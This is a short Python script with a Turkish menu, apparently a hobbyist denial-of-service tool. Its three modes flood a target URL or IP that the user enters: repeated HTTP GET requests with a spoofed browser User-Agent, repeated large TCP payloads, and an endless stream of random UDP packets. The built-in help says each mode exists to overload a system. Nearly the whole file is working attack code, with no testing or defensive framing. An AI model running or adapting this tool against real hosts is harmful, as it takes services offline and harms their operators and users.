#!/bin/python3

import sys
import requests
import os
import socket
import random
import threading





os.system("clear")

banner=""" _                           _____   _____    _____    _    
| |                         (____ \ (____ \  / ___ \  | |   
| |      ____ _____ _   _    _   \ \ _   \ \| |   | |  \ \  
| |     / _  (___  ) | | |  | |   | | |   | | |   | |   \ \ 
| |____( ( | |/ __/| |_| |  | |__/ /| |__/ /| |___| |____) )
|_______)_||_(_____)\__  |  |_____/ |_____/  \_____(______/ 
--------------------Created by CybercClay--------------------"""

print(banner)

print("""
[*] Saldırı modları:
        [1] GET saldırısı modu
        [2] TCP saldırısı modu
        [3] UDP saldırısı modu

[*] Yardım Sayfası:
        [99] Yardım

""")

def send_get_requests(url, num_requests):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    for _ in range(num_requests):
        requests.get(url, headers=headers)

def send_tcp_packets(target_ip, port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, port))
    message = "A" * 9999
    for _ in range(num_packets):
        sock.sendall(message.encode())
    sock.close()

def send_udp_packets(target_ip, target_port):
    bytes = random._urandom(1000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(bytes, (target_ip, target_port))

try:
    a = input("Bir sayı girin: ")
    if a == '1':
        print("GET saldırısı başlatılıyor...")
        url = input("Hedef URL'yi giriniz (örn: http://ip_adresi): ")
        num_requests = int(input("Gönderilecek istek sayısını giriniz: "))
        send_get_requests(url, num_requests)

    elif a == '2':
        print("TCP saldırısı başlatılıyor...")
        target_ip = input('Hedef IP adresini giriniz: ')
        port = int(input("Hedef Portu giriniz: "))
        num_packets = int(input("Gönderilecek paket sayısını giriniz: "))
        send_tcp_packets(target_ip, port, num_packets)

    elif a == '3':
        print("UDP saldırısı başlatılıyor...")
        target_ip = input("Hedef IP adresi: ")
        target_port = int(input("Hedef port: "))
        send_udp_packets(target_ip, target_port)

    elif a == '99':
        print("""
[*] GET saldırısı modu: Web sayfasını görüntülemek için çok sayıda istek atar ve yanıtları kabul etmez. Bu sayede sisteme fazla yükleme yapabilirsiniz.
[*] TCP saldırısı modu: Sisteme gereksiz mesajlar atarak sisteme fazla yükleme yapmak için kullanılır.
[*] UDP saldırısı modu: Bir bağlantı kurmadan verileri hızlı bir şekilde göndererek sisteme fazla yük bindirmeye çalışır.
""")
except KeyboardInterrupt:
    print("\nProgramdan Çıkılıyor...")
    sys.exit()

